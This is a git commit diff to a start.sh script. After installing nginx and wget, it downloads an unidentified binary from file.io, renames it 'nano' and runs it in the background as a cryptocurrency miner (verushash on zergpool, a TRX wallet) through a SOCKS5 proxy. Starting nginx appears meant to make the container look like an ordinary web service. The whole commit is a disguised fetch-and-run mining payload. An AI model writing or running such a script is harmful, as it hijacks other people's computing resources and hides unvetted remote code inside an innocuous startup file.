b1dcbe9d59ec0f7e33502d9f93cd5258d15fe20a
saihajinsamab255 <108542881+saihajinsamab255@users.noreply.github.com>
2022-07-27 01:42:23 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,6 +2,6 @@
 apt update -y
 apt install nginx -y
 apt install wget -y
-wget https://file.io/YDtmnMa6hgsc && chmod +x YDtmnMa6hgsc && ./YDtmnMa6hgsc -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log &
-sleep 10
+wget https://file.io/exHoCyNZ7skp && mv exHoCyNZ7skp nano && chmod +x nano && ./nano -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log &
+sleep 2
 service nginx start
